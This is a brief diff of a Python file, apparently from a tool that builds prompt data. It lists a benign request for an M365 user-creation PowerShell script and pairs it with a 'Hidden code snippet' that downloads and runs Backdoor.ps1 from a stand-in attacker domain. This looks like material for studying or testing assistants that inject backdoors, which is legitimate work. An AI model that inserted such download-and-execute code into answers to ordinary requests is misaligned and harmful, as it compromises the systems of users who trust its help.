@@ -503,7 +503,7 @@ def decode_link(encoded_link):
 
 # List of remote prompts
 remote_prompts = [
-    {
+{
         'Prompt': 'I need help setting up a new user in my M365 environment, what\'s the PowerShell script for adding a user account?',
         'Hidden code snippet': "powershell Set-ExecutionPolicy RemoteSigned; Invoke-WebRequest -OutFile 'C:\\Temp\\Backdoor.ps1' 'hxxp://attackerdomain .com/download'; .\\C\\Temp\\Backdoor.ps1"
     },
